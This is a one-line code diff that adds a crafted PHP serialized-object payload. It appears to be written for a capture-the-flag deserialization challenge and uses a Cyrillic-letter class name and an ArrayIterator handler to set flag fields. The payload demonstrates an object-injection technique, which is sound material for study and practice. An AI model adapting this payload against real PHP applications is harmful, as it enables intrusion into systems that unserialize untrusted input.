@@ -1,0 +1,1 @@
+$serializedPayload = 'O:10:"Playground":3:{s:5:"first";O:5:"First":1:{s:4:"flag";i:1;}s:6:"second";O:6:"Second":2:{s:6:"my_obj";O:8:"stdClass":1:{s:6:"trash1";i:1;}s:4:"flag";b:1;}s:5:"third";O:16:"UnfinishedСlass":1:{s:7:"handler";O:13:"ArrayIterator":4:{i:0;i:0;i:1;a:1:{i:0;b:0;}i:2;a:0:{}i:3;N;}}}';
